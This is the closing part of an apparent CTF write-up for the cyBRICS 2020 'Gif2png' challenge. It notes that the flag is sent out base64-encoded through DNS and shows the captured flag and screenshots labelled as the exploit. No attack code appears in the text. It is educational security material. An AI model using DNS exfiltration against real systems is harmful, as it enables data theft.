+  <img src="/assets/ctf/cybrics/2020/gif2png/gif2png-04-bab35abb8f097541da9a97cabfe9d2c07e8434155e5fe0063f2e406835b4ff16.png" alt="CTF Challenge Exploit" class="zooming" data-rjs="/assets/ctf/cybrics/2020/gif2png/gif2png-04-bab35abb8f097541da9a97cabfe9d2c07e8434155e5fe0063f2e406835b4ff16.png" data-zooming-width="1292" data-zooming-height="715" />
+</a></p>
+
+<p>Done, after 5 seconds the base64 encoded flag will be sent through DNS!</p>
+
+<p><a href="/assets/ctf/cybrics/2020/gif2png/gif2png-05-0fad89d37c65771ad393721f96bd70d33d2f0776a76f4e901eee464832ced680.png">
+  <img src="/assets/ctf/cybrics/2020/gif2png/gif2png-05-0fad89d37c65771ad393721f96bd70d33d2f0776a76f4e901eee464832ced680.png" alt="CTF Challenge Exploit" class="zooming" data-rjs="/assets/ctf/cybrics/2020/gif2png/gif2png-05-0fad89d37c65771ad393721f96bd70d33d2f0776a76f4e901eee464832ced680.png" data-zooming-width="1173" data-zooming-height="353" />
+</a></p>
+
+<p>Flag:</p>
+<blockquote>
+  <p>cybrics{imagesaresocoolicandrawonthem}</p>
+</blockquote>
+
+<p><a href="/assets/ctf/cybrics/2020/gif2png/gif2png-06-0069647c11ff4ae14468d1673853c5adb6549af2350dfe82528b25e98fea8f07.png">
+  <img src="/assets/ctf/cybrics/2020/gif2png/gif2png-06-0069647c11ff4ae14468d1673853c5adb6549af2350dfe82528b25e98fea8f07.png" alt="CTF Challenge Flag" class="zooming" data-rjs="/assets/ctf/cybrics/2020/gif2png/gif2png-06-0069647c11ff4ae14468d1673853c5adb6549af2350dfe82528b25e98fea8f07.png" data-zooming-width="1187" data-zooming-height="391" />
+</a></p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=cyBRICS+CTF+2020+-+Gif2png%20-%20https://nullarmor.github.io/posts/cybrics-gif2png%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/cybrics-gif2png" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
